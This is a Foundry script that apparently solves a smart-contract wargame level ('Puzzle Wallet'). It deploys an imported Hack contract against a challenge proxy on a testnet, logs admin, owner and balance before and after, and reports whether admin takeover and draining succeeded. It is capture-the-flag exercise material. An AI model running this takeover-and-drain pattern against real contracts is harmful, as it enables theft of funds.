// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, PuzzleProxy, PuzzleWallet} from "../src/level24.sol";

contract Level24Script is Script {
    function run(address instanceAddress, address walletAddress) external {
        PuzzleProxy target = PuzzleProxy(instanceAddress);
        PuzzleWallet wallet = PuzzleWallet(instanceAddress);

        address adminBefore = target.admin();
        address ownerBefore = wallet.owner();
        uint256 contractBalanceBefore = address(target).balance;
        uint256 maxBalanceBefore = wallet.maxBalance();

        console.log("Admin before:", adminBefore);
        console.log("Owner before:", ownerBefore);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Max balance before:", maxBalanceBefore);
        console.log("Wallet address:", walletAddress);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack{value: contractBalanceBefore}(walletAddress);
        vm.stopBroadcast();

        address adminAfter = target.admin();
        address ownerAfter = wallet.owner();
        uint256 contractBalanceAfter = address(target).balance;
        uint256 maxBalanceAfter = wallet.maxBalance();

        console.log("Admin after:", adminAfter);
        console.log("Owner after:", ownerAfter);
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Max balance after:", maxBalanceAfter);
        console.log(
            "Attack successful:",
            adminAfter == walletAddress && contractBalanceAfter == 0
        );
    }
}
//forge script script/level24.s.sol:Level24Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address,address)" your instance address your wallet address
